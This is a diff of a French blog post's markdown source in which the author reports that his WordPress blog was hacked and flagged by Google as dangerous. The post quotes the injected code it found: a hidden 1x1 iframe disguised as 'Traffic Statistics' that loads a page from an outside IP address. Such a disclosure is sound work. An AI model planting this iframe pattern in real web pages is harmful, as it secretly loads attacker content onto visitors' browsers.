@@ -7,26 +7,26 @@ author: Régis
 layout: post
 guid: http://regis.decamps.info/blog/2008/05/ce-blog-sest-fait-kacker/
 permalink: /blog/2008/05/ce-blog-sest-fait-kacker/
-tmac_last_id:
-  - ""
+
 dsq_thread_id:
   - "564520470"
 categories:
-  - Général
-  - Informatique
+  - High-tech
+  - Misc
 tags:
-  - Hacking
+  - Misc
   - Sécurité
 ---
 Attention, mon blog a été hacké.
 
-Google indiquait que mon blog était &lsquo;potentiellement dangereux’. J’ai d’abord cru qu’ils avaient fumé ; mais en fait non. 
+Google indiquait que mon blog était `potentiellement dangereux’. J’ai d’abord cru qu’ils avaient fumé ; mais en fait non. 
 
 Par exemple, quelques posts contenaient
   
-`<br />
-<!-- Traffic Statistics --> <iframe src=http://xx.155.8.157/iframe/wp-stats.php width=1 height=1 frameborder=0></iframe> <!-- End Traffic Statistics --><br />
-` 
+```
+<!-- Traffic Statistics --> <iframe src=http://xx.155.8.157/iframe/wp-stats.php width=1 height=1 frameborder=0></iframe> <!-- End Traffic Statistics -->
+```
+
 
 WordPress a connu un certain nombre de failles de sécurité, et j’ai un peu de mal à suivre les mises à jour. 
 
